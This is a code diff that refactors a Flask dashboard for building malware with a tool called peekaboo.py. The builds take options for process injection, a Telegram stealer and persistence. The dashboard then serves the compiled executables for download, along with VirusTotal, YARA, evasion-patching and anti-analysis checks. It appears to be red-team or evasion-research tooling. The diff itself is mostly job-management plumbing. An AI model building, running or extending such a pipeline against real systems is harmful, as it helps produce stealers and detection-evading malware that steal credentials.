@@ -90,8 +90,15 @@ if HAS_MITRE and _db.count_mitre_entries() == 0:
         print(f"[db] MITRE library migration skipped: {_e}")
 
 # -- in-memory job store --------------------------------------------------------
-_builds: dict = {}
-_lock = threading.Lock()
+# BuildManager owns the live-build state + DB persistence + SSE fan-out.
+# The legacy `_builds` / `_lock` symbols below are intentionally removed; see
+# build_manager.py.
+from build_manager import BuildManager, EV_STATE, EV_LINE, EV_END
+_build_mgr = BuildManager(
+    base_dir    = BASE_DIR,
+    malware_dir = MALWARE_DIR,
+    peekaboo_py = BASE_DIR / "peekaboo.py",
+)
 
 
 # -- helpers --------------------------------------------------------------------
@@ -158,10 +165,7 @@ def _c2_resolve_binary(data: dict) -> Path | None:
         build_id = data.get("build_id", "").strip()
         if not build_id:
             return None
-        with _lock:
-            job = dict(_builds.get(build_id, {}))
-        if not job:
-            job = _db.get_build(build_id) or {}
+        job = _build_mgr.get(build_id) or {}
         if not job:
             return None
         p = _resolve_build_binary(job)
@@ -188,52 +192,7 @@ def _c2_resolve_binary(data: dict) -> Path | None:
     return _find_latest_binary()
 
 
-def _save_build(build_id: str) -> None:
-    with _lock:
-        entry = dict(_builds.get(build_id, {}))
-    _db.save_build(entry)
-
-
-def _run_build(build_id: str, params: dict) -> None:
-    with _lock:
-        _builds[build_id]["status"] = "running"
-        _builds[build_id]["start_time"] = datetime.now().isoformat()
-
-    cmd = [
-        "python3", str(BASE_DIR / "peekaboo.py"),
-        "-p", params.get("payload", "meow"),
-        "-e", params.get("encryption", "speck"),
-        "-m", params.get("malware", "injection"),
-        "-i", params.get("injection", "virtualallocex"),
-        "-s", params.get("stealer", "telegram"),
-        "-r", params.get("persistence", "none"),
-    ]
-
-    try:
-        result = subprocess.run(cmd, capture_output=True, text=True,
-                                timeout=120, cwd=str(BASE_DIR))
-        out = result.stdout + result.stderr
-        status = "success" if result.returncode == 0 else "failed"
-        rc = result.returncode
-    except subprocess.TimeoutExpired:
-        out, status, rc = "Build timed out after 120 seconds.", "timeout", -1
-    except Exception as exc:
-        out, status, rc = str(exc), "error", -1
-
-    # derive binary path and store it so history can serve downloads
-    if status == "success":
-        malware_type = params.get("malware", "injection")
-        if malware_type == "stealer":
-            bin_path = MALWARE_DIR / "stealer" / params.get("stealer", "telegram") / "peekaboo.exe"
-        else:
-            bin_path = MALWARE_DIR / "injection" / params.get("injection", "virtualallocex") / "peekaboo.exe"
-        with _lock:
-            _builds[build_id]["params"] = dict(params, out_path=str(bin_path.relative_to(BASE_DIR)))
-
-    with _lock:
-        _builds[build_id].update(output=out, returncode=rc, status=status,
-                                  end_time=datetime.now().isoformat())
-    _save_build(build_id)
+# _run_build / _save_build moved into BuildManager (build_manager.py).
 
 
 # -- standard routes ------------------------------------------------------------
@@ -251,82 +210,79 @@ def api_modules():
     return jsonify(get_modules())
 
 
+_ALLOWED_BUILD_FILES = {"peekaboo.exe", "persistence.exe"}
+
+
 @app.route("/api/build", methods=["POST"])
 def api_build():
     params = request.get_json(silent=True) or {}
-    build_id = uuid.uuid4().hex[:8]
-    with _lock:
-        _builds[build_id] = {
-            "id": build_id, "params": params, "status": "queued",
-            "output": "", "returncode": None,
-            "created": datetime.now().isoformat(),
-            "start_time": None, "end_time": None,
-        }
-    threading.Thread(target=_run_build, args=(build_id, params), daemon=True).start()
+    build_id = _build_mgr.submit(params)
     return jsonify({"build_id": build_id})
 
 
 @app.route("/api/build/<build_id>")
 def api_build_status(build_id: str):
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
-    if not job:
-        job = _db.get_build(build_id) or {}
+    job = _build_mgr.get(build_id)
     if not job:
         return jsonify({"error": "not found"}), 404
     return jsonify(job)
 
 
+@app.route("/api/build/<build_id>/stream")
+def api_build_stream(build_id: str):
+    """SSE: incremental state + output lines for one running build."""
+    def generate():
+        try:
+            for ev in _build_mgr.tail(build_id):
+                yield f"data: {json.dumps(ev)}\n\n"
+            yield "data: [DONE]\n\n"
+        except GeneratorExit:
+            raise
+        except Exception as exc:
+            try:
+                yield f"data: {json.dumps({'type': 'end', 'status': 'error', 'msg': str(exc)})}\n\n"
+                yield "data: [DONE]\n\n"
+            except GeneratorExit:
+                raise
+
+    return Response(
+        stream_with_context(generate()),
+        content_type="text/event-stream",
+        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
+    )
+
+
 @app.route("/api/build/<build_id>/files")
 def api_build_files(build_id: str):
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
+    job = _build_mgr.get(build_id)
     if not job:
         return jsonify({"error": "not found"}), 404
+    return jsonify({"files": _build_mgr.list_files(job), "build_id": build_id})
+
+
+def _resolve_download(build_id: str, filename: str):
+    if filename not in _ALLOWED_BUILD_FILES:
+        return None, ("not allowed", 400)
+    job = _build_mgr.get(build_id)
+    if not job:
+        return None, ("not found", 404)
     if job.get("status") != "success":
-        return jsonify({"files": []})
-    params = job.get("params", {})
-    malware_type = params.get("malware", "injection")
-    persistence  = params.get("persistence", "none")
-
-    if malware_type == "stealer":
-        stealer = params.get("stealer", "telegram")
-        out_dir = MALWARE_DIR / "stealer" / stealer
-    else:
-        out_dir = MALWARE_DIR / "injection" / params.get("injection", "virtualallocex")
-
-    files = []
-    peekaboo = out_dir / "peekaboo.exe"
-    if peekaboo.exists():
-        files.append({"name": "peekaboo.exe", "size": peekaboo.stat().st_size})
-    if persistence != "none":
-        pers_exe = out_dir / "persistence.exe"
-        if pers_exe.exists():
-            files.append({"name": "persistence.exe", "size": pers_exe.stat().st_size,
-                          "technique": persistence})
-    return jsonify({"files": files, "build_id": build_id})
+        return None, ("build not successful", 400)
+    main = _build_mgr.resolve_binary(job)
+    if not main:
+        return None, ("binary not found", 404)
+    path = main if filename == "peekaboo.exe" else main.parent / filename
+    if not path.exists():
+        return None, (f"{filename} not found", 404)
+    return path, None
 
 
 @app.route("/api/build/<build_id>/download/<filename>")
 def api_build_download(build_id: str, filename: str):
-    allowed = {"peekaboo.exe", "persistence.exe"}
-    if filename not in allowed:
-        return jsonify({"error": "not allowed"}), 400
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
-    if not job:
-        return jsonify({"error": "not found"}), 404
-    if job.get("status") != "success":
-        return jsonify({"error": "build not successful"}), 400
-    params = job.get("params", {})
-    if params.get("malware") == "stealer":
-        out_dir = MALWARE_DIR / "stealer" / params.get("stealer", "telegram")
-    else:
-        out_dir = MALWARE_DIR / "injection" / params.get("injection", "virtualallocex")
-    file_path = out_dir / filename
-    if not file_path.exists():
-        return jsonify({"error": f"{filename} not found"}), 404
-    return send_file(file_path, as_attachment=True, download_name=filename,
+    path, err = _resolve_download(build_id, filename)
+    if err:
+        return jsonify({"error": err[0]}), err[1]
+    return send_file(path, as_attachment=True, download_name=filename,
                      mimetype="application/octet-stream")
 
 
@@ -399,61 +355,33 @@ def api_builds_binaries_clear():
         return jsonify({"ok": False, "error": str(e)}), 500
 
 
+# Legacy _resolve_build_binary / _resolve_build_files removed - BuildManager
+# (resolve_binary / list_files) is now the only place this math lives.
+
+# Thin shims kept so `/api/logs` and any other callers below still compile.
 def _resolve_build_binary(build: dict) -> Path | None:
-    """Return the Path to a build's primary binary, or None if not found."""
-    params = build.get("params", {})
-    stored = params.get("out_path", "")
-    if stored:
-        p = Path(stored) if Path(stored).is_absolute() else BASE_DIR / stored
-        if p.exists():
-            return p
-    # Fallback for dashboard builds that pre-date out_path storage
-    malware_type = params.get("malware", "")
-    if malware_type == "stealer":
-        p = MALWARE_DIR / "stealer" / params.get("stealer", "telegram") / "peekaboo.exe"
-    elif "injection" in params:
-        p = MALWARE_DIR / "injection" / params["injection"] / "peekaboo.exe"
-    else:
-        return None
-    return p if p.exists() else None
+    return _build_mgr.resolve_binary(build)
 
 
 def _resolve_build_files(build: dict) -> list[dict]:
-    """Return all available compiled files for a build (main binary + persistence if present)."""
-    p = _resolve_build_binary(build)
-    if not p:
-        return []
-    files = [{"name": p.name, "size": p.stat().st_size, "type": "main"}]
-    # persistence is always compiled into the same directory as the main binary
-    pers = p.parent / "persistence.exe"
-    if pers.exists():
-        files.append({"name": "persistence.exe", "size": pers.stat().st_size, "type": "persistence"})
-    return files
+    return _build_mgr.list_files(build)
 
 
 @app.route("/api/build/<build_id>/binary-info")
 def api_build_binary_info(build_id: str):
-    """Return info about the compiled binary for any build (live or historical)."""
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
-    if not job:
-        job = _db.get_build(build_id) or {}
+    """Compiled binary info for live or historical builds."""
+    job = _build_mgr.get(build_id)
     if not job:
         return jsonify({"error": "not found"}), 404
-    if job.get("status") != "success":
-        return jsonify({"files": []})
-    return jsonify({"files": _resolve_build_files(job)})
+    return jsonify({"files": _build_mgr.list_files(job)})
 
 
 @app.route("/api/build/<build_id>/binary/<filename>")
 def api_build_binary_download(build_id: str, filename: str):
-    """Download a compiled binary from any build (live or historical)."""
+    """Download a compiled binary from a live or historical build."""
     if filename not in {"peekaboo.exe", "persistence.exe"}:
         return jsonify({"error": "not allowed"}), 400
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
-    if not job:
-        job = _db.get_build(build_id) or {}
+    job = _build_mgr.get(build_id) or {}
     if not job:
         return jsonify({"error": "not found"}), 404
     if job.get("status") != "success":
@@ -1736,7 +1664,7 @@ def api_pipeline_run():
                         })
             yield "data: [DONE]\n\n"
         except GeneratorExit:
-            # client closed the EventSource — must re-raise without yielding
+            # client closed the EventSource - must re-raise without yielding
             raise
         except Exception as e:
             try:
@@ -1913,10 +1841,7 @@ def api_vtscan_from_build():
     build_id = data.get("build_id", "").strip()
     if not build_id:
         return jsonify({"ok": False, "error": "build_id required"}), 400
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
-    if not job:
-        job = _db.get_build(build_id) or {}
+    job = _build_mgr.get(build_id) or {}
     if not job:
         return jsonify({"ok": False, "error": "build not found"}), 404
     if job.get("status") != "success":
@@ -1996,10 +1921,7 @@ def api_yara_from_build():
     build_id = data.get("build_id", "").strip()
     if not build_id:
         return jsonify({"ok": False, "error": "build_id required"}), 400
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
-    if not job:
-        job = _db.get_build(build_id) or {}
+    job = _build_mgr.get(build_id) or {}
     if not job:
         return jsonify({"ok": False, "error": "build not found"}), 404
     if job.get("status") != "success":
@@ -2095,10 +2017,7 @@ def api_evasion_analyse():
 
     build_id = data.get("build_id", "").strip()
     if build_id:
-        with _lock:
-            job = dict(_builds.get(build_id, {}))
-        if not job:
-            job = _db.get_build(build_id) or {}
+        job = _build_mgr.get(build_id) or {}
         if not job or job.get("status") != "success":
             return jsonify({"ok": False, "error": "build not found or not successful"}), 404
         p = _resolve_build_binary(job)
@@ -2170,10 +2089,7 @@ def api_evasion_patch():
         session_id = data.get("session_id", "").strip()
         filename   = data.get("filename", "").strip()
         if build_id:
-            with _lock:
-                job = dict(_builds.get(build_id, {}))
-            if not job:
-                job = _db.get_build(build_id) or {}
+            job = _build_mgr.get(build_id) or {}
             if job and job.get("status") == "success":
                 p = _resolve_build_binary(job)
                 if p:
@@ -2473,10 +2389,7 @@ def api_pe_analyse_build():
     build_id = data.get("build_id", "").strip()
     if not build_id:
         return jsonify({"ok": False, "error": "build_id required"}), 400
-    with _lock:
-        job = dict(_builds.get(build_id, {}))
-    if not job:
-        job = _db.get_build(build_id) or {}
+    job = _build_mgr.get(build_id) or {}
     if not job or job.get("status") != "success":
         return jsonify({"ok": False, "error": "build not found or not successful"}), 404
     p = _resolve_build_binary(job)
@@ -2605,10 +2518,7 @@ def api_antianalysis_scan():
         build_id = data.get("build_id", "").strip()
         if not build_id:
             return jsonify({"ok": False, "error": "build_id required"}), 400
-        with _lock:
-            job = dict(_builds.get(build_id, {}))
-        if not job:
-            job = _db.get_build(build_id) or {}
+        job = _build_mgr.get(build_id) or {}
         if not job or job.get("status") != "success":
             return jsonify({"ok": False, "error": "build not found or not successful"}), 404
         p = _resolve_build_binary(job)
@@ -2713,10 +2623,7 @@ def api_rop_scan():
         build_id = data.get("build_id", "").strip()
         if not build_id:
             return jsonify({"ok": False, "error": "build_id required"}), 400
-        with _lock:
-            job = dict(_builds.get(build_id, {}))
-        if not job:
-            job = _db.get_build(build_id) or {}
+        job = _build_mgr.get(build_id) or {}
         if not job or job.get("status") != "success":
             return jsonify({"ok": False, "error": "build not found or not successful"}), 404
         p = _resolve_build_binary(job)
